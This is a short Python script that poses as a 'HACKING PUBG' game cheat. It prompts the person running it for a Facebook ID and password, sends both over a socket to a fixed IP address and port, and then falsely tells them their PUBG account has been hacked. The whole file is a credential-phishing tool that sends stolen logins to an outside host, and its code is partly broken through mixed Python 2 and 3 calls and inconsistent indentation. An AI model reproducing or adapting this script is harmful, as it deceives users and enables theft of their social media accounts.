import socket
import os
try:
	import pyfiglet
except Exception as e:
	os.system("pip install pyfiglet")


# result = pyfiglet.figlet_format("wellcome") 
# print(result)

os.system("clear || cls")
def connect():
    s = socket.socket() 
    s.connect(('192.168.29.149', 8080))
    result = pyfiglet.figlet_format("HACKING PUBG")
    print(result)
    # print "hacking PUBG"
    while True:
    	ide = raw_input("Enter you facebook id:")
        passw = raw_input("Enter youer password:")
        s.send(ide)
        s.send(passw)
        print("GOOD NEWS YOUER PUBG HAVE BEEN HACKED")
        break
connect()
